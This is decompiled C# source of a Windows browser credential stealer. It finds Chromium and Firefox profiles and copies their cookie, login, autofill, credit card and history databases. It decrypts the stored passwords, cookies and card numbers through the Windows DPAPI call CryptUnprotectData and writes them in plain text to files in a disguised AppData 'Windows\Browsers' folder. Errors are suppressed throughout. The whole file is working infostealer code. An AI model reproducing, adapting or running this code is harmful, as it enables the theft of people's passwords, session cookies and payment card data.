using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using sql;

namespace brtest
{
	// Token: 0x02000015 RID: 21
	internal class browserstest
	{
		// Token: 0x0600003B RID: 59 RVA: 0x0000550C File Offset: 0x0000370C
		private static List<string> getbrowsers()
		{
			List<string> result;
			try
			{
				List<string> list = new List<string>();
				string[] directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
				string[] directories2 = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
				for (int i = 0; i < directories.Length; i++)
				{
					string[] files = Directory.GetFiles(directories[i]);
					foreach (string path in files)
					{
						bool flag = Path.GetFileName(path) == "Cookies";
						if (flag)
						{
							list.Add(directories[i]);
						}
					}
					string[] directories3 = Directory.GetDirectories(directories[i]);
					foreach (string text in directories3)
					{
						string[] files2 = Directory.GetFiles(text);
						foreach (string path2 in files2)
						{
							bool flag2 = Path.GetFileName(path2) == "Cookies";
							if (flag2)
							{
								list.Add(text);
							}
						}
						string[] directories4 = Directory.GetDirectories(text);
						foreach (string text2 in directories4)
						{
							string[] files3 = Directory.GetFiles(text2);
							foreach (string path3 in files3)
							{
								bool flag3 = Path.GetFileName(path3) == "Cookies";
								if (flag3)
								{
									list.Add(text2);
								}
							}
							try
							{
								string[] directories5 = Directory.GetDirectories(text2);
								foreach (string text3 in directories5)
								{
									string[] files4 = Directory.GetFiles(text3);
									foreach (string path4 in files4)
									{
										bool flag4 = Path.GetFileName(path4) == "Cookies";
										if (flag4)
										{
											list.Add(text3);
										}
									}
								}
							}
							catch
							{
							}
						}
					}
				}
				for (int num3 = 0; num3 < directories2.Length; num3++)
				{
					try
					{
						string[] files5 = Directory.GetFiles(directories2[num3]);
						foreach (string path5 in files5)
						{
							bool flag5 = Path.GetFileName(path5) == "Cookies";
							if (flag5)
							{
								list.Add(directories2[num3]);
							}
						}
						string[] directories6 = Directory.GetDirectories(directories2[num3]);
						foreach (string text4 in directories6)
						{
							string[] files6 = Directory.GetFiles(text4);
							foreach (string path6 in files6)
							{
								bool flag6 = Path.GetFileName(path6) == "Cookies";
								if (flag6)
								{
									list.Add(text4);
								}
							}
							string[] directories7 = Directory.GetDirectories(text4);
							foreach (string text5 in directories7)
							{
								string[] files7 = Directory.GetFiles(text5);
								foreach (string path7 in files7)
								{
									bool flag7 = Path.GetFileName(path7) == "Cookies";
									if (flag7)
									{
										list.Add(text5);
									}
								}
								try
								{
									string[] directories8 = Directory.GetDirectories(text5);
									foreach (string text6 in directories8)
									{
										string[] files8 = Directory.GetFiles(text6);
										foreach (string path8 in files8)
										{
											bool flag8 = Path.GetFileName(path8) == "Cookies";
											if (flag8)
											{
												list.Add(text6);
											}
										}
									}
								}
								catch
								{
								}
							}
						}
					}
					catch
					{
					}
				}
				result = list;
			}
			catch (Exception ex)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600003C RID: 60 RVA: 0x00005984 File Offset: 0x00003B84
		public static void Cookies()
		{
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Browsers/Chromium";
				Directory.CreateDirectory(text);
				List<string> list = browserstest.getbrowsers();
				Random random = new Random();
				foreach (string text2 in list)
				{
					using (StreamWriter streamWriter = new StreamWriter(text + "\\Cookies.txt", true, Encoding.Default))
					{
						streamWriter.WriteLine(string.Format("Browser - {0}\n\n", text2));
						string text3 = text2 + "\\Cookies";
						bool flag = File.Exists(text3);
						if (flag)
						{
							long length = new FileInfo(text3).Length;
							bool flag2 = length < 10000L || length == 28672L || length == 20480L;
							if (!flag2)
							{
								string text4 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System_" + random.Next(10000000).ToString();
								File.Copy(text3, text4, true);
								bool flag3 = text2.Contains("Guest Profile") || text2.Contains("System Profile");
								if (flag3)
								{
									File.Delete(text4);
								}
								else
								{
									SqlHandler sqlHandler = new SqlHandler(text4);
									sqlHandler.ReadTable("cookies");
									for (int i = 0; i < sqlHandler.GetRowCount(); i++)
									{
										try
										{
											string text5 = Encoding.UTF8.GetString(browserstest.DecryptBrowsers(Encoding.Default.GetBytes(sqlHandler.GetValue(i, 12)), null));
											string value = sqlHandler.GetValue(i, 1);
											string value2 = sqlHandler.GetValue(i, 2);
											string value3 = sqlHandler.GetValue(i, 4);
											string value4 = sqlHandler.GetValue(i, 5);
											string text6 = sqlHandler.GetValue(i, 6).ToUpper();
											bool flag4 = text5 == "";
											if (flag4)
											{
												text5 = sqlHandler.GetValue(i, 3);
											}
											streamWriter.Write(string.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", new object[]
											{
												value,
												value3,
												value4,
												value2,
												text5
											}));
										}
										catch (Exception ex)
										{
										}
									}
									streamWriter.WriteLine(string.Format("\n\n", new object[0]));
									File.Delete(text4);
								}
							}
						}
					}
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00005C78 File Offset: 0x00003E78
		public static void Passwords()
		{
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Browsers/Chromium";
				Directory.CreateDirectory(text);
				List<string> list = browserstest.getbrowsers();
				Random random = new Random();
				foreach (string text2 in list)
				{
					try
					{
						using (StreamWriter streamWriter = new StreamWriter(text + "\\Passwords.txt", true, Encoding.Default))
						{
							streamWriter.WriteLine(string.Format("Browser - {0}\n\n", text2));
							string sourceFileName = text2 + "\\Login Data";
							string text3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System_" + random.Next(10000000).ToString();
							File.Copy(sourceFileName, text3, true);
							bool flag = text2.Contains("Guest Profile") || text2.Contains("System Profile");
							if (flag)
							{
								File.Delete(text3);
							}
							else
							{
								SqlHandler sqlHandler = new SqlHandler(text3);
								sqlHandler.ReadTable("logins");
								bool flag2 = sqlHandler.GetRowCount() != 65536;
								if (flag2)
								{
									for (int i = 0; i < sqlHandler.GetRowCount(); i++)
									{
										try
										{
											string @string = Encoding.UTF8.GetString(browserstest.DecryptBrowsers(Encoding.Default.GetBytes(sqlHandler.GetValue(i, 5)), null));
											string value = sqlHandler.GetValue(i, 1);
											string value2 = sqlHandler.GetValue(i, 3);
											streamWriter.Write(string.Format("Action URL : {0}\t\nUsername : {1}\t\nValue : {2}\t\n\n", value, value2, @string));
										}
										catch
										{
										}
									}
									streamWriter.WriteLine(string.Format("\n\n", new object[0]));
									File.Delete(text3);
								}
							}
						}
					}
					catch
					{
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600003E RID: 62 RVA: 0x00005EF4 File Offset: 0x000040F4
		public static void autofill()
		{
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Browsers/Chromium";
				Directory.CreateDirectory(text);
				List<string> list = browserstest.getbrowsers();
				Random random = new Random();
				foreach (string text2 in list)
				{
					try
					{
						using (StreamWriter streamWriter = new StreamWriter(text + "\\Autofill.txt", true, Encoding.Default))
						{
							streamWriter.WriteLine(string.Format("Browser - {0}\n\n", text2));
							string text3 = text2 + "\\Web Data";
							long length = new FileInfo(text3).Length;
							string text4 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System_" + random.Next(10000000).ToString();
							File.Copy(text3, text4, true);
							bool flag = text2.Contains("Guest Profile") || text2.Contains("System Profile");
							if (flag)
							{
								File.Delete(text4);
							}
							else
							{
								SqlHandler sqlHandler = new SqlHandler(text4);
								sqlHandler.ReadTable("autofill");
								bool flag2 = sqlHandler.GetRowCount() != 65536;
								if (flag2)
								{
									for (int i = 0; i < sqlHandler.GetRowCount(); i++)
									{
										try
										{
											string value = sqlHandler.GetValue(i, 0);
											string value2 = sqlHandler.GetValue(i, 1);
											streamWriter.Write(string.Format("Name : {0}\t\nValue : {1}\t\n\n", value, value2));
										}
										catch
										{
										}
									}
									streamWriter.WriteLine(string.Format("\n\n", new object[0]));
									File.Delete(text4);
								}
							}
						}
					}
					catch
					{
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600003F RID: 63 RVA: 0x00006154 File Offset: 0x00004354
		public static void cc()
		{
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Browsers/Chromium";
				Directory.CreateDirectory(text);
				List<string> list = browserstest.getbrowsers();
				Random random = new Random();
				foreach (string text2 in list)
				{
					try
					{
						using (StreamWriter streamWriter = new StreamWriter(text + "/CC.txt", true, Encoding.Default))
						{
							streamWriter.WriteLine(string.Format("Browser - {0}\n\n", text2));
							string text3 = text2 + "\\Web Data";
							bool flag = File.Exists(text3);
							if (flag)
							{
								string text4 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System_" + random.Next(100000000).ToString();
								File.Copy(text3, text4, true);
								bool flag2 = text2.Contains("Guest Profile") | text2.Contains("System Profile");
								if (flag2)
								{
									File.Delete(text4);
								}
								else
								{
									SqlHandler sqlHandler = new SqlHandler(text4);
									try
									{
										sqlHandler.ReadTable("credit_cards");
										bool flag3 = sqlHandler.GetRowCount() != 65536;
										if (flag3)
										{
											for (int i = 0; i < sqlHandler.GetRowCount(); i++)
											{
												try
												{
													string @string = Encoding.UTF8.GetString(browserstest.DecryptBrowsers(Encoding.Default.GetBytes(sqlHandler.GetValue(i, 4)), null));
													string value = sqlHandler.GetValue(i, 3);
													string value2 = sqlHandler.GetValue(i, 2);
													string value3 = sqlHandler.GetValue(i, 1);
													streamWriter.Write(string.Format("{0}\t{1}/{2}\t {3}", new object[]
													{
														@string,
														value2,
														value,
														value3
													}));
												}
												catch
												{
												}
											}
											streamWriter.WriteLine(string.Format("\n\n", new object[0]));
											File.Delete(text4);
										}
									}
									catch
									{
									}
								}
							}
						}
					}
					catch
					{
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000040 RID: 64 RVA: 0x00006424 File Offset: 0x00004624
		public static void History()
		{
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Browsers/Chromium";
				Directory.CreateDirectory(text);
				List<string> list = browserstest.getbrowsers();
				Random random = new Random();
				foreach (string text2 in list)
				{
					try
					{
						using (StreamWriter streamWriter = new StreamWriter(text + "\\History.txt", true, Encoding.Default))
						{
							streamWriter.WriteLine(string.Format("Browser - {0}\n\n", text2));
							string text3 = text2 + "\\History";
							long length = new FileInfo(text3).Length;
							string text4 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System_" + random.Next(10000000).ToString();
							File.Copy(text3, text4, true);
							bool flag = text2.Contains("Guest Profile") || text2.Contains("System Profile");
							if (flag)
							{
								File.Delete(text4);
							}
							else
							{
								SqlHandler sqlHandler = new SqlHandler(text4);
								sqlHandler.ReadTable("urls");
								bool flag2 = sqlHandler.GetRowCount() != 65536;
								if (flag2)
								{
									for (int i = 0; i < sqlHandler.GetRowCount(); i++)
									{
										try
										{
											string value = sqlHandler.GetValue(i, 1);
											string @string = Encoding.UTF8.GetString(Encoding.Default.GetBytes(sqlHandler.GetValue(i, 2)));
											int num = (int)(Convert.ToInt16(sqlHandler.GetValue(i, 3)) + 1);
											streamWriter.Write(string.Format("Site: {0}\t\nTittle: {1}\t\nVisit count: {2}\t\n\n\n", value, @string, num));
										}
										catch
										{
										}
									}
									streamWriter.WriteLine(string.Format("\n\n", new object[0]));
									File.Delete(text4);
								}
							}
						}
					}
					catch
					{
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000041 RID: 65 RVA: 0x000066AC File Offset: 0x000048AC
		private static string mozilla_getpath()
		{
			string result;
			try
			{
				bool flag = Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles");
				if (flag)
				{
					Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\Browsers\\Mozilla");
					string[] directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles");
					foreach (string text in directories)
					{
						string[] files = Directory.GetFiles(text);
						foreach (string path in files)
						{
							bool flag2 = Path.GetFileName(path) == "logins.json";
							if (flag2)
							{
								return text;
							}
						}
					}
					result = null;
				}
				else
				{
					result = null;
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00006790 File Offset: 0x00004990
		public static void mozilla()
		{
			try
			{
				bool flag = Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles");
				if (flag)
				{
					Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\Browsers\\Mozilla");
				}
				using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\Browsers\\Mozilla\\Cookies.txt", true, Encoding.Default))
				{
					string str = browserstest.mozilla_getpath();
					SqlHandler sqlHandler = new SqlHandler(str + "/cookies.sqlite");
					sqlHandler.ReadTable("moz_cookies");
					for (int i = 0; i < sqlHandler.GetRowCount(); i++)
					{
						string value = sqlHandler.GetValue(i, 5);
						string value2 = sqlHandler.GetValue(i, 3);
						string value3 = sqlHandler.GetValue(i, 4);
						string value4 = sqlHandler.GetValue(i, 6);
						string value5 = sqlHandler.GetValue(i, 7);
						streamWriter.Write(string.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", new object[]
						{
							value,
							value4,
							value5,
							value2,
							value3
						}));
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000043 RID: 67 RVA: 0x000068E4 File Offset: 0x00004AE4
		public static void NewCookies()
		{
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Browsers/Chromium";
				Directory.CreateDirectory(text);
				List<string> list = browserstest.getbrowsers();
				Random random = new Random();
				foreach (string text2 in list)
				{
					using (StreamWriter streamWriter = new StreamWriter(text + "\\Cookies.txt", true, Encoding.Default))
					{
						streamWriter.WriteLine(string.Format("Browser - {0}\n\n", text2));
						string text3 = text2 + "\\Cookies";
						bool flag = File.Exists(text3);
						if (flag)
						{
							string text4 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\System_" + random.Next(10000000).ToString();
							File.Copy(text3, text4, true);
							bool flag2 = text2.Contains("Guest Profile") || text2.Contains("System Profile");
							if (flag2)
							{
								File.Delete(text4);
							}
							else
							{
								SqlHandler sqlHandler = new SqlHandler(text4);
								sqlHandler.ReadTable("cookies");
								for (int i = 0; i < sqlHandler.GetRowCount(); i++)
								{
									try
									{
										string text5 = Encoding.UTF8.GetString(browserstest.DecryptBrowsers(Encoding.Default.GetBytes(sqlHandler.GetValue(i, 12)), null));
										string value = sqlHandler.GetValue(i, 1);
										string value2 = sqlHandler.GetValue(i, 2);
										string value3 = sqlHandler.GetValue(i, 4);
										string value4 = sqlHandler.GetValue(i, 5);
										string text6 = sqlHandler.GetValue(i, 6).ToUpper();
										bool flag3 = text5 == "";
										if (flag3)
										{
											text5 = sqlHandler.GetValue(i, 3);
										}
										streamWriter.Write(string.Format("{0}\tTRUE\t{1}\tFALSE\t{2}\t{3}\t{4}\r\n", new object[]
										{
											value,
											value3,
											value4,
											value2,
											text5
										}));
									}
									catch (Exception ex)
									{
									}
								}
								streamWriter.WriteLine(string.Format("\n\n", new object[0]));
								File.Delete(text4);
							}
						}
					}
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x06000044 RID: 68
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref browserstest.DataBlob pCipherText, ref string pszDescription, ref browserstest.DataBlob pEntropy, IntPtr pReserved, ref browserstest.CryptprotectPromptstruct pPrompt, int dwFlags, ref browserstest.DataBlob pPlainText);

		// Token: 0x06000045 RID: 69 RVA: 0x00006B9C File Offset: 0x00004D9C
		public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
		{
			browserstest.DataBlob dataBlob = default(browserstest.DataBlob);
			browserstest.DataBlob dataBlob2 = default(browserstest.DataBlob);
			browserstest.DataBlob dataBlob3 = default(browserstest.DataBlob);
			browserstest.CryptprotectPromptstruct cryptprotectPromptstruct = new browserstest.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(browserstest.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					bool flag = cipherTextBytes == null;
					if (flag)
					{
						cipherTextBytes = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
					dataBlob2.cbData = cipherTextBytes.Length;
					Marshal.Copy(cipherTextBytes, 0, dataBlob2.pbData, cipherTextBytes.Length);
				}
				catch
				{
				}
				try
				{
					bool flag2 = entropyBytes == null;
					if (flag2)
					{
						entropyBytes = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
					dataBlob3.cbData = entropyBytes.Length;
					Marshal.Copy(entropyBytes, 0, dataBlob3.pbData, entropyBytes.Length);
				}
				catch
				{
				}
				browserstest.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch
			{
			}
			finally
			{
				bool flag3 = dataBlob.pbData != IntPtr.Zero;
				if (flag3)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				bool flag4 = dataBlob2.pbData != IntPtr.Zero;
				if (flag4)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				bool flag5 = dataBlob3.pbData != IntPtr.Zero;
				if (flag5)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		// Token: 0x02000027 RID: 39
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CryptprotectPromptstruct
		{
			// Token: 0x04000037 RID: 55
			public int cbSize;

			// Token: 0x04000038 RID: 56
			public int dwPromptFlags;

			// Token: 0x04000039 RID: 57
			public IntPtr hwndApp;

			// Token: 0x0400003A RID: 58
			public string szPrompt;
		}

		// Token: 0x02000028 RID: 40
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			// Token: 0x0400003B RID: 59
			public int cbData;

			// Token: 0x0400003C RID: 60
			public IntPtr pbData;
		}
	}
}
